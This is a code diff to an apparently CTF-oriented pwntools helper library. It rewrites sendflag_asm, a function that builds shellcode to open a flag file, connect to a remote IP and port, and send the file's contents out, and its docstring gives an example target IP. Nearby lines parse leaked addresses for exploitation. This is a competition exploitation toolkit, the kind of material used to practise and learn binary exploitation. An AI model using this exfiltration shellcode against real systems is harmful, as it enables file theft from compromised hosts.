@@ -32,18 +32,19 @@ getaddr_byte    = lambda p: u64(p.recv(6).ljust(8, b'\x00'))
 send_num = lambda p, num, buffer_size: p.send(bytes(str(num), 'utf-8').ljust(buffer_size, b'\x00'))
 
 # 发送flag的shellcode
-def sendflag_asm(ip, port = 9999, filename = './flag', file_fd = 3, socket_fd = 4, network = 'ipv4'):
+def sendflag_asm(ip, port = 9999, filename = './flag', network = 'ipv4'):
 	'''
 		编写socket客户端的shellcode，发送flag
   
   		eg:
 			p.send(asm(sendflag_asm('39.99.32.130')))
 	'''	
-	payload = ''
-	payload += shellcraft.open(filename)
-	payload += shellcraft.connect(ip, port, network)
-	payload += shellcraft.sendfile(socket_fd, file_fd, 0, 0x100)
-	return payload
+	shellcode = ''
+	shellcode += shellcraft.open(filename)
+	shellcode += shellcraft.mov('ebx', 'eax')
+	shellcode += shellcraft.connect(ip, port, network)
+	shellcode += shellcraft.sendfile('edi', 'ebx', 0, 0x100)
+	return shellcode
 
 def get_libc_version(libc):
     '''
